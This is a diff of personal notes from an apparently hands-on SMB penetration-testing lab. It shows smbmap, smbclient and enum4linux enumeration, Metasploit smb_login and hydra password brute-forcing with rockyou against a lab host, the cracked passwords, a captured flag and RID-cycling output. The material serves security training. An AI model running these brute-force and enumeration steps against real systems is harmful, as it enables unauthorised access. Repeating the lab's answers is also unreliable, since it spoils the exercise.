@@ -214,9 +214,9 @@ Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret 
 - Use **/usr/share/metasploit-framework/data/wordlists/common_users.txt** username dictionary
 - Use **/usr/share/metasploit-framework/data/wordlists/common_passwords.txt** password dictionary
 
+![[Pasted image 20230717145859.png]]
 
-
-
+metasploit zet meteen een ssh session op, 
 
 
 
@@ -245,8 +245,8 @@ Demo enumerating shares
 - smbmap 
 	- enumerate shares on target system: smbmap -H targetip -u admin -p password1 
 	- access the found shares through smbclient
-		- smbclient -L ip -U admin 
-		- smbclient //ip/Sharename -U admin
+		- is the share browseable: smbclient -L ip -U admin 
+			- If the share is browseable, you will see a list of available shares on the specified server.
 		- smbclient //ip/Sharename -U admin 
 			- get flag - exit 
 			- ls our directory 
@@ -256,10 +256,75 @@ Demo enumerating shares
 	- enum4linux -a -u admin -p password1 target 
 	
 
+--- Lab 0000 
 
 
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
 
 
+- What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
+
+
+192.89.93.3:445 - Success: '.\jane:**abc123'**
+
+
+- What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
+
+
+root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 192.89.93.3 smb
+Hydritary or secret service organizations, or for illegal purposes.
+a v8.8 (c) 2019 by van Hauser/THC - Please do not use in mil
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-17 13:14:42
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+[DATA] attacking smb://192.89.93.3:445/
+[445][smb] host: 192.89.93.3   login: admin   password: **password1**
+  
+- Which share is read only? Use smbmap with credentials obtained in question 2. nancy is read only 
+  
+  ![[Pasted image 20230717153817.png]]
+  
+  
+- Is share “jane” browseable? Use credentials obtained from the 1st question.
+
+root@attackdefense:~# smbclient -L 192.89.93.3 -U jane
+Enter WORKGROUP\jane's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        shawn           Disk      
+        nancy           Disk      
+        admin           Disk      
+        IPC$            IPC       IPC Service (brute.samba.recon.lab)
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        RECONLABS            
+
+  
+- Fetch the flag from share “admin”
+![[Pasted image 20230717155242.png]]
+
+2727069bc058053bd561ce372721c92e
+
+
+- List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
+
+
+![[Pasted image 20230717154754.png]]
+
+  
+- List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2 
+
+
+S-1-22-1-1000 Unix User\shawn (Local User)
+S-1-22-1-1001 Unix User\jane (Local User)
+S-1-22-1-1002 Unix User\nancy (Local User) 
 
 
 
